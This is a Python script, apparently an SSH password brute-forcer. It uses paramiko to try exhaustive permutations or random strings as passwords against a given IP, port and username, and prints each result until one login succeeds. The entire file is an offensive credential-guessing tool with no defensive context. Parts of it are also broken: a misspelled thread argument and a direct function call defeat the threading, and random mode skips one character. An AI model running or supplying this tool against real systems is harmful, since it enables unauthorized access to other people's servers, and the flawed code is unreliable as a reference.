import random
import string
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import logging
from logging import NullHandler
import threading
import itertools

def connect(mode, ip, sshPort, uname):
    print('Mode: ' + mode)
    options = ''.join(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation + ' ')
    passLen = 4
    while True:
        #Generate Password
        if mode == "continuous":
            for i in range(50):
                genPass = itertools.permutations(options, passLen)
                for val in genPass:
                    valClean = ''.join(val)
                    ssh_client = SSHClient()
                    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
                    try:
                        ssh_client.connect(ip,port=sshPort,username=uname, password=valClean, banner_timeout=300)
                        print('Password - ' + valClean + ' is Correct.')
                        quit()
                    except AuthenticationException:
                        print('Password - ' + valClean + ' is Incorrect.')
                    except ssh_exception.SSHException:
                        print("**** Attempting to connect - Rate limiting on server ****")

                passLen = passLen + 1

        if mode == "random":
            while True:
                genPass = ''
                for i in range(random.randint(4, 35)):
                    genPass += options[random.randint(1, len(options) - 1)]

                #Make Connection
                ssh_client = SSHClient()
                ssh_client.set_missing_host_key_policy(AutoAddPolicy())
                try:
                    ssh_client.connect(ip,port=sshPort,username=uname, password=genPass, banner_timeout=300)
                    print('Password - ' + genPass + ' is Correct.')
                    quit()
                except AuthenticationException:
                    print('Password - ' + genPass + ' is Incorrect.')
                except ssh_exception.SSHException:
                    print("**** Attempting to connect - Rate limiting on server ****")


def __main__():
    ip = input('IP: ')
    sshPort = input('Port: ')
    uname = input('Username: ')
    mode = input('Mode(continuous/random): ')
    numbThreads = input('Number Of Threads: ')
    if mode != 'continuous' and mode != 'random':
        quit()
    else:
        #Threading
        threads = []
        for i in range(int(numbThreads)):
            t = threading.Thread(tarkget=connect(mode, ip, sshPort, uname))
            t.daemon = True
            threads.append(t)

        for i in range(int(numbThreads)):
            threads[i].start()

        for i in range(int(numbThreads)):
            threads[i].join()

__main__()